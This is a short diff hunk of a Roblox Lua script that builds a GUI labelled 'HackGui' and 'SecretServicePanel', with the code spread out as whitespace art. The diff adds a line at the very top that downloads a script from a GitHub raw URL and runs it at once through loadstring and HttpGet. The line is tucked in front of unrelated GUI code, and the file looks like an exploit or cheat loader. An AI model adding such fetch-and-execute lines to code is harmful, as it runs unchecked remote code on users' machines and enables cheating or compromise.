@@ -1,4 +1,4 @@
-                                                                                 SecretServicePanel=   
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BatuKvi123/f3xhub/main/f3xhub"))()                                                                                  SecretServicePanel=   
                                                                         Instance.new("ScreenGui");HackGui=              
                                                                     SecretServicePanel or Instance.new("ScreenGui",nil) ;local    
                                                                 Frame=Instance.new("Frame");local TextLabel=Instance.new("TextLabel");  
